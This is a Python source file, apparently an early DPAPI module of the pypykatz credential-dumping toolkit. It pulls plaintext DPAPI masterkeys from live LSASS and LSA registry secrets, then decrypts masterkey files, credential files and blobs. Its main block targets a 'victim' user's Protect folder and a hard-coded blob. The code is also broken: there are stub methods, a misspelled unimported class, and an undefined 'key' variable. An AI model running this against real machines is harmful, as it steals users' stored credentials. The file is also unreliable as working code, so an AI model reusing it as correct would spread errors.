import os

from pypykatz import logger
from pypykatz.dpapi.structures.masterkeyfile import MasterKeyFile
from pypykatz.dpapi.structures.credentialfile import CredentialFile
from pypykatz.dpapi.structures.blob import DPAPI_BLOB

class DPAPIUserKey:
	def __init__(self):
		self.dunno = None
	
	def from_registry(self):
		pass
		
	def from_password(self):
		pass
		
	def from_lsa(self):
		pass
		
class DPAPIKey:
	def __init__(self):
		self.sid = None
		self.password = None
		self.password = None
	
	def from_registry(self):
		pass
		
	def from_password(self):
		pass
		
	def from_lsa(self):
		pass


class DPAPI:
	def __init__(self):
		self.user_keys = []
		self.machine_keys = []
	
	@staticmethod
	def list_masterkeys():
		#logger.debug('Searching for MasterKey files...')
		#appdata = os.environ.get('APPDATA')
		#'%APPDATA%\Microsoft\Protect\%SID%'
		#'%SYSTEMDIR%\Microsoft\Protect'
		# TODO: implement this
		pass
		
	def get_masterkeys_from_lsass(self):
		"""
		Returns the plaintext final masterkeys! No need to decrpyt and stuff!
		"""
		from pypykatz.pypykatz import pypykatz
		katz = pypykatz.go_live()
		for x in katz.logon_sessions:
			for dc in katz.logon_sessions[x].dpapi_creds:
				print(dc.masterkey)
				self.user_keys.append(bytes.fromhex(dc.masterkey))
	
	def get_keys_form_registry_live(self):
		from pypykatz.registry.live_parser import LiveRegistry
		from pypykatz.registry.security.common import LSASecretDPAPI
		lr = None
		try:
			lr = LiveRegistry.go_live()
		except Exception as e:
			logger.debug('Failed to obtain registry secrets via direct registry reading method')
			try:
				lr = OffineRegistry.from_live_system()
			except Exception as e:
				logger.debug('Failed to obtain registry secrets via filedump method')
		
		if lr is not None:
			for secret in lr.security.cached_secrets:
				if isinstance(secret, LSASecretDPAPI):
					print('Found DPAPI key in registry!')
					self.user_keys.append(secret.user_key)
					self.machine_keys.append(secret.machine_key)
						
		else:
			raise Exception('Registry parsing failed!')
	
	def decrypt_masterkey(self, data):
		mkf = MasterKeyFile.from_bytes(data)
		
		if mkf.masterkey is not None:
			for user_key in self.user_keys:
				dec_key = mkf.masterkey.decrypt(user_key)
				print(dec_key)
			for machine_key in self.machine_keys:
				dec_key = mkf.masterkey.decrypt(machine_key)
				print(dec_key)
				
	def decrypt_credential(self, data):
		cred = CredentialFile.from_bytes(data)
		return cred.blob.decrypt(key)
		
	def decrypt_blob(self, data):
		blob = DPAPI_BLOB.from_bytes(data)
		print(str(blob))
		return blob.decrypt(key)
	
	
	
if __name__ == '__main__':
	filename = 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3448413973-1765323015-1500960949-1105\\4c9764dc-aa99-436c-bb30-ff39b3dd407c'
	dpapi = DPAPI()
	dpapi.get_masterkeys_from_lsass()
	#with open(filename, 'rb') as f:
	#	dpapi.decrypt_masterkey(f.read())
	
	data = bytes.fromhex('01000000d08c9ddf0115d1118c7a00c04fc297eb01000000dc64974c99aa6c43bb30ff39b3dd407c0000000002000000000003660000c000000010000000f1af675a51c8283cf81abb6fb600110f0000000004800000a0000000100000009bf4e56d6c32dd59bce655496a94444c1000000088438c8f61d966ac220b4ca50933c8ee14000000314eaa780e358e70c586fb47bee0e27549be480e')
	dpapi.decrypt_blob(data)